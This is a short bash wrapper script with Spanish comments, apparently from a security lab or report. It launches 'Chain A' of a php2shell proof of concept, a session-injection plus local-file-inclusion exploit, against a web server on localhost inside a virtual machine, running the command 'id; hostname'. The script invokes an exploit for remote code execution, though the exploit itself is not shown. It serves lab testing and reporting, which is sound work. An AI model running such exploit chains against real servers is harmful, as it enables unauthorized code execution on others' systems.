#!/usr/bin/env bash
# chain-a.sh — ejecuta Chain A de php2shell desde M1 (session injection + LFI).
set -uo pipefail
cd "$(dirname "$0")/../.." || exit 1

./informe/tools/vm.sh m1 '
cd ~/tools/php2shell-poc/exploit || exit 1
python3 chain_a_session_lfi.py \
  --host 127.0.0.1 --port 80 \
  --inject-path /index.php \
  --lfi-path /lfi.php \
  --session-path /tmp \
  --command "id; hostname" \
  --cleanup-on --attempts 3
'
